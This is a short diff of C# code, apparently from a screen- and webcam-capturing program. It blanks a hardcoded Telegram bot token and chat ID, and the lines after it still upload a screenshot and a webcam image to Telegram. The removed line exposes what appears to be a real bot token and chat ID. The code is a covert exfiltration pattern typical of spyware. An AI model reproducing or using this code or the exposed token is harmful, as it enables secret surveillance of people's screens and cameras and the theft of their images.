@@ -38,7 +38,7 @@ class Program
 
 					try
 					{
-						var tg = new SendTelegram("8506055327:AAEBKfzh7NjnLzR4BD4C4WUqlSjqyybXegg", "8177843619");
+						var tg = new SendTelegram(" ", " ");
 
 						await tg.SendFileAsync("screenshot.png", "scr");
 						await tg.SendFileAsync("cam.jpg", "cam");
